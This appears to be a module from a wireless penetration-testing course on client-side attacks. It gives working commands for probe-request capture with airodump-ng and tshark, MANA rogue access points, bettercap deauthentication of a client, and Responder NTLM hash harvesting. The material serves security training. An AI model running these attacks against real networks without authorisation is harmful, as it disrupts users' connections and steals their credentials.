# Module 05 — Client-Side Attacks

## 5.1 Probe Request Analysis

### Preferred Network List (PNL)

Clients broadcast probe requests for saved networks:
```
Client: "Is 'HomeWiFi' here?"
Client: "Is 'StarbucksWiFi' here?"
Client: "Is 'CorpNet' here?"
```

### Capture with airodump-ng

```bash
# Capture probe requests
sudo airodump-ng --band abg -w probe-capture wlan0mon

# Extract with tshark
tshark -r probe-capture-01.cap -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.sa -e wlan.ssid
```

---

## 5.2 MANA Attack

### Loud Mode

MANA responds to ALL probes with matching SSIDs:

```bash
# Enable MANA in hostapd-mana
mana_loud=1
```

---

## 5.3 Bettercap WiFi Modules

```bash
# Start bettercap
sudo bettercap -iface wlan0mon

# WiFi reconnaissance
wifi.recon on
wifi.recon.channel 1,6,11

# Show targets
wifi.show

# Deauth specific client
wifi.deauth 00:11:22:33:44:55
```

---

## 5.4 Credential Harvesting

### Responder.py Integration

```bash
# Start Responder on rogue interface
sudo responder -I wlan0 -wrfv

# Captures:
# - NTLM hashes from Windows clients
# - LLMNR/NBT-NS poisoned responses
# - WPAD proxy requests
```

---

**Next**: [Module 06 — Post-Exploitation](06-post-exploitation.md)
